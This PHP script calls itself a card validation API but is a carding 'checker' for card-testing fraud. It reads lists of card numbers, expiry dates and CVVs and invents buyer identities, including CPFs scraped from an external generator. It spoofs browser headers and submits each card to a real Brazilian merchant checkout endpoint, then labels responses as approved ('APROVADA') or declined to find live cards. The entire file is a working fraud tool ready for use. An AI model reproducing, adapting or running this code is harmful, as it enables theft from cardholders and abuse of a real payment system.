<?php
/**
 * API de Validação de Cartões - Versão Corrigida v3
 * @author souess
 * Atualização: Novos códigos de retorno adicionados
 */

// Configurações de output para streaming
@ini_set('output_buffering', 'off');
@ini_set('zlib.output_compression', false);
@ini_set('implicit_flush', true);
ob_implicit_flush(true);
while (ob_get_level() > 0) ob_end_flush();

// Headers de segurança
header('Content-Type: text/html; charset=UTF-8');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');

// Configurações
define('MAX_TENTATIVAS', 3);
define('TIMEOUT_CURL', 30);
define('DELAY_ENTRE_REQUESTS', 2);

/**
 * Gera CPF válido via API externa
 */
function gerarCpfApi() {
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://www.4devs.com.br/ferramentas_online.php',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'acao' => 'gerar_cpf',
            'pontuacao' => 'S',
            'cpf_estado' => ''
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => TIMEOUT_CURL,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        ]
    ]);
    
    $resposta = curl_exec($ch);
    $erro = curl_error($ch);
    curl_close($ch);

    if ($erro || !$resposta) {
        error_log("Erro ao gerar CPF: $erro");
        return null;
    }

    if (preg_match('/\d{3}\.\d{3}\.\d{3}-\d{2}/', $resposta, $matches)) {
        return $matches[0];
    }

    return null;
}

/**
 * Gera nome aleatório
 */
function gerarNome() {
    $nomes = ["Ana", "Carlos", "Fernanda", "Lucas", "Juliana", "Ricardo", "Mariana", "Pedro", "Beatriz", "Gabriel"];
    $sobrenomes = ["Silva", "Souza", "Oliveira", "Pereira", "Costa", "Rodrigues", "Santos", "Almeida", "Lima", "Ferreira"];
    return $nomes[array_rand($nomes)] . ' ' . $sobrenomes[array_rand($sobrenomes)];
}

/**
 * Gera telefone brasileiro válido
 */
function gerarTelefone() {
    $ddds = ["11", "21", "31", "41", "51", "61", "71", "81", "85", "91"];
    $ddd = $ddds[array_rand($ddds)];
    $numero = '9' . rand(1000, 9999) . rand(1000, 9999);
    return "($ddd) $numero";
}

/**
 * Gera data de nascimento válida (18-60 anos)
 */
function gerarNascimento() {
    $inicio = strtotime('-60 years');
    $fim = strtotime('-18 years');
    $random = rand($inicio, $fim);
    return date('d/m/Y', $random);
}

/**
 * Limpa e extrai mensagem de erro
 */
function limparMensagemErro($texto) {
    if (empty($texto)) return 'Resposta vazia';
    
    if (preg_match('/ERRO:(.*)/i', $texto, $matches)) {
        $msg = $matches[1];
    } else {
        $msg = $texto;
    }
    
    $msg = preg_replace('/[{}\[\]\'":\-]/', '', $msg);
    $msg = preg_replace('/\s+/', ' ', $msg);
    return trim(substr($msg, 0, 200));
}

/**
 * Valida formato de cartão
 */
function validarFormatoCartao($card) {
    $partes = explode("|", $card);
    if (count($partes) !== 4) return false;
    
    list($numero, $mm, $aa, $cvv) = $partes;
    
    if (!preg_match('/^\d{15,16}$/', $numero)) return false;
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $mm)) return false;
    if (!preg_match('/^\d{2,4}$/', $aa)) return false;
    if (!preg_match('/^\d{3,4}$/', $cvv)) return false;
    
    return true;
}

/**
 * Processa lista de cartões
 */
function processarLista($lista) {
    if (empty($lista)) return [];
    
    $lista = trim($lista);
    $lista = str_replace([" ", ":", ";", ",", "=>", "-", "/", "|||"], "|", $lista);
    $cards = [];

    if (preg_match_all("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $lista, $matches)) {
        $tmp = explode("|", $lista);
        for ($i = 0; $i < count($tmp); $i += 4) {
            if (isset($tmp[$i + 3])) {
                $card = "{$tmp[$i]}|{$tmp[$i+1]}|{$tmp[$i+2]}|{$tmp[$i+3]}";
                if (validarFormatoCartao($card)) {
                    $cards[] = $card;
                }
            }
        }
    }
    
    return $cards;
}

/**
 * Inicializa sessão cURL com headers completos
 */
function inicializarCurl() {
    $ch = curl_init();
    
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding: gzip, deflate, br',
        'Content-Type: application/json',
        'Origin: https://app.pactosolucoes.com.br',
        'Referer: https://app.pactosolucoes.com.br/',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Site: same-origin',
        'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"'
    ];
    
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => TIMEOUT_CURL,
        CURLOPT_ENCODING => 'gzip, deflate, br',
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_COOKIEJAR => '/tmp/cookies.txt',
        CURLOPT_COOKIEFILE => '/tmp/cookies.txt'
    ]);
    
    return $ch;
}

/**
 * Tenta validar um cartão
 */
function tentarCartao($session, $card, $id_venda, $token_checkout) {
    list($numero, $mm, $aaaa, $cvv) = explode("|", $card);
    
    if (strlen($aaaa) == 2) {
        $aaaa = '20' . $aaaa;
    }

    for ($tentativa = 1; $tentativa <= MAX_TENTATIVAS; $tentativa++) {
        sleep(DELAY_ENTRE_REQUESTS);
        
        $nome = gerarNome();
        $cpf = gerarCpfApi();
        
        if (!$cpf) {
            if ($tentativa < MAX_TENTATIVAS) continue;
            echo "━━━━━━━━━━━━━━━━━━━━━━\n";
            echo "💳 $numero|$mm|$aaaa|$cvv\n";
            echo "❌ <b>ERRO</b> » Não foi possível gerar CPF\n";
            echo "━━━━━━━━━━━━━━━━━━━━━━\n\n";
            return;
        }
        
        $email = strtolower(str_replace(' ', '', explode(" ", $nome)[0])) . rand(1000, 9999) . "@gmail.com";
        $nascimento = gerarNascimento();
        $telefone = gerarTelefone();

        $payload = json_encode([
            "unidade" => "1",
            "plano" => 305,
            "nome" => $nome,
            "email" => $email,
            "cpf" => $cpf,
            "dataNascimento" => $nascimento,
            "sexo" => "F",
            "telefone" => $telefone,
            "nomeCartao" => strtolower($nome),
            "numeroCartao" => $numero,
            "validade" => "$mm/$aaaa",
            "cvv" => $cvv,
            "nrVezesDividir" => 1,
            "cobrarParcelasEmAberto" => true
        ]);

        curl_setopt($session, CURLOPT_URL, "https://app.pactosolucoes.com.br/api/prest/v2/vendas/$id_venda/alunovendaapp/$token_checkout");
        curl_setopt($session, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($session, CURLOPT_POST, true);

        $inicio = microtime(true);
        $res = curl_exec($session);
        $tempo = round(microtime(true) - $inicio, 2);
        
        if (curl_errno($session)) {
            $erro = curl_error($session);
            echo "━━━━━━━━━━━━━━━━━━━━━━\n";
            echo "💳 $numero|$mm|$aaaa|$cvv\n";
            echo "❌ <b>ERRO CURL</b> » $erro\n";
            echo "⏱ Tempo: {$tempo}s\n";
            echo "━━━━━━━━━━━━━━━━━━━━━━\n\n";
            if ($tentativa < MAX_TENTATIVAS) continue;
            return;
        }

        $result_limitado = limparMensagemErro($res);
        $linha_html = "$numero|$mm|$aaaa|$cvv";
        $resultado = "";
        
        // Verifica todos os códigos de aprovação
        if (stripos($result_limitado, 'LR_00') !== false || stripos($result_limitado, 'lr_00') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(LIVE - 00)</i>";
        } elseif (stripos($result_limitado, 'LR_100') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(100)</i>";
        } elseif (stripos($result_limitado, 'LR_LIVE!') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(LIVE!)</i>";
        } elseif (stripos($result_limitado, 'LR_N7') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(N7)</i>";
        } elseif (stripos($result_limitado, 'LR_51') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(51)</i>";
        } elseif (stripos($result_limitado, 'LR_54') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(54)</i>";
        } elseif (stripos($result_limitado, 'LR_1045') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(1045)</i>";
        } elseif (stripos($result_limitado, 'LR_63') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(63)</i>";
        } elseif (stripos($result_limitado, 'LR_83') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(83)</i>";
        } elseif (stripos($result_limitado, 'LR_12') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(12)</i>";
        } elseif (stripos($result_limitado, 'LR_VBV') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(VBV)</i>";
        } elseif (stripos($result_limitado, 'LR_FA') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(FA)</i>";
        } elseif (stripos($result_limitado, 'LR_A6') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(A6)</i>";
        } elseif (stripos($result_limitado, 'LR_101') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(101)</i>";
        } elseif (stripos($result_limitado, 'succeeded') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(PAGAMENTO APROVADO)</i>";
        } elseif (stripos($result_limitado, '00') !== false && stripos($result_limitado, 'aprovada') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(TRANSAÇÃO APROVADA)</i>";
        } elseif (stripos($result_limitado, 'LR_BV') !== false) {
            $resultado = "✅ <b>APROVADA</b> » <i>(LIVE EXPIRED AMEX)</i>";
        }
        
        // Exibição formatada
        if (!empty($resultado)) {
            echo "━━━━━━━━━━━━━━━━━━━━━━\n";
            echo "💳 {$linha_html}\n";
            echo "{$resultado}\n";
            echo "⏱ Tempo: {$tempo}s\n";
            echo "━━━━━━━━━━━━━━━━━━━━━━\n\n";
        } else {
            // Limpa texto bruto
            $mensagem_limpa = preg_replace('/LR_/i', '', $result_limitado);
            $mensagem_limpa = preg_replace('/ID_\w+/i', '', $mensagem_limpa);
            $mensagem_limpa = trim(str_replace(['return', '()', '  '], '', $mensagem_limpa));

            // Se tiver a mensagem padrão longa de erro, simplifica:
            if (stripos($mensagem_limpa, 'tente outra forma') !== false) {
                $mensagem_limpa = "Tente outra forma de pagamento. Cartão reprovado.";
            }

            echo "━━━━━━━━━━━━━━━━━━━━━━\n";
            echo "💳 {$linha_html}\n";
            echo "❌ <b>REPROVADA</b> » {$mensagem_limpa}\n";
            echo "⏱ Tempo: {$tempo}s\n";
            echo "━━━━━━━━━━━━━━━━━━━━━━\n\n";
        }
        
        flush();
        
        if (strpos($result_limitado, "Mais de um cadastro") === false) {
            break;
        }
    }
}

// ==================== EXECUÇÃO PRINCIPAL ====================

try {
    $lista = $_GET['lista'] ?? '';
    $cards = processarLista($lista);
    
    if (empty($cards) && file_exists('db.txt')) {
        $linhas = file('db.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($linhas as $linha) {
            if (validarFormatoCartao(trim($linha))) {
                $cards[] = trim($linha);
            }
        }
    }
    
    if (empty($cards)) {
        echo "<div style='color:#FF0000; font-weight: bold;'>❌ Nenhum cartão válido fornecido. Use ?lista=NUMERO|MM|AAAA|CVV</div>";
        exit;
    }
    
    echo "" . count($cards) . "";
    flush();
    
    // Inicializa sessão com headers completos
    $session = inicializarCurl();
    
    $url_pacto = "https://app.pactosolucoes.com.br/api/prest/v2/vendas/442c3f0cf4adcba347aa73d42785bcc8/tkn/b624cd96e4b4fbc4140a9ed66b5e9350";
    
    if (!preg_match('/vendas\/([^\/]+)/', $url_pacto, $match)) {
        throw new Exception("URL inválida - não foi possível extrair ID da venda");
    }
    
    $id_venda = $match[1];
    
    // Obtém token de checkout
    curl_setopt($session, CURLOPT_URL, $url_pacto);
    curl_setopt($session, CURLOPT_POST, true);
    curl_setopt($session, CURLOPT_POSTFIELDS, '');
    
    $res = curl_exec($session);
    
    if (curl_errno($session)) {
        throw new Exception("Erro ao conectar: " . curl_error($session));
    }
    
    $json = json_decode($res, true);
    $token_checkout = is_array($json) ? array_values($json)[0] ?? null : null;
    
    if (!$token_checkout) {
        throw new Exception("Erro ao obter token de checkout. Verifique se a URL e credenciais estão corretas. Resposta: " . substr($res, 0, 200));
    }
    
    // Obtém planos
    sleep(1);
    curl_setopt($session, CURLOPT_URL, "https://app.pactosolucoes.com.br/api/prest/v2/vendas/$id_venda/planos/1");
    curl_setopt($session, CURLOPT_HTTPGET, true);
    curl_setopt($session, CURLOPT_POST, false);
    curl_exec($session);
    
    // Processa cada cartão
    foreach ($cards as $index => $card) {
        echo "<tropa du gordin" . ($index + 1) . "/" . count($cards) . "</div>\n";
        flush();
        
        sleep(1);
        tentarCartao($session, $card, $id_venda, $token_checkout);
    }
    
    curl_close($session);
    
    echo "@cybersecofc";
    
} catch (Exception $e) {
    echo "<div style='color:#FF0000; font-weight: bold; margin: 10px 0;'>❌ Erro fatal: " . htmlspecialchars($e->getMessage()) . "</div>\n";
    error_log("Erro na API: " . $e->getMessage());
}
?>